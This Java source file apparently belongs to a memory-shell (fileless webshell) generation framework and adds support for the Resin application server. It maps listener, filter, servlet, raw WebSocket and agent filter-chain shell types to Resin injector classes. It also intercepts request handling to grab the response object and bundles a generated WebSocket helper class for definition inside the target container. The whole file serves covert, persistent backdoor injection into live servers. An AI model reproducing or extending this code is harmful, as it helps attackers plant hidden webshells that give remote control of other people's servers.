package com.reajason.javaweb.memshell.server.resin;

import com.reajason.javaweb.memshell.RawWsHelperNames;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;

import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/14
 */
public class Resin extends AbstractServer {

    public static class ListenerInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            response = ShellCommonUtil.getFieldValue(request, "_response");
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.resin.ResinListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.resin.ResinFilterInjector")
                .addInjector(RAW_WEBSOCKET, "com.reajason.javaweb.memshell.injector.resin.ResinRawWsInjector")
                .addInjector(SERVLET, "com.reajason.javaweb.memshell.injector.resin.ResinServletInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.resin.ResinFilterChainAgentInjector")
                .build();
    }

    /**
     * RawWebSocket 需要按 shell 类名派生 helper 并随注入器下发；helper 在目标容器里
     * 由注入器先 defineClass，shell 构造时按名字自行解析。Resin 3/4 由 helper 自行
     * 选择 upgradeProtocol 或 startDuplex 接管连接。
     */
    @Override
    public byte[] postProcessShellBytes(byte[] shellBytes, ShellConfig shellConfig,
                                        ShellToolConfig shellToolConfig, InjectorConfig injectorConfig) {
        if (RAW_WEBSOCKET.equals(shellConfig.getShellType())) {
            String helperClassName = RawWsHelperNames.helperClassName(shellToolConfig.getShellClassName());
            injectorConfig.setHelperClassBytes(ResinRawWsHelperGenerator.getBytes(helperClassName, shellConfig));
        }
        return shellBytes;
    }
}
